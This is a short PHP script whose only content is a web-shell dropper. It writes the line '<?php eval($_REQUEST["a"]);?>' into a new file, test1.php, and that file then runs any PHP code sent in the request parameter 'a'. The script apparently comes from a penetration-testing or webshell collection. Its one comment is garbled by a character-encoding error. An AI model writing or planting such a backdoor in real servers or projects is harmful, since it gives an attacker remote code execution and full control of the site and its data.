<?php
//��ǰ·��������test1.php�ļ�
$test='<?php eval($_REQUEST["a"]);?>';
file_put_contents('test1.php',$test);
?>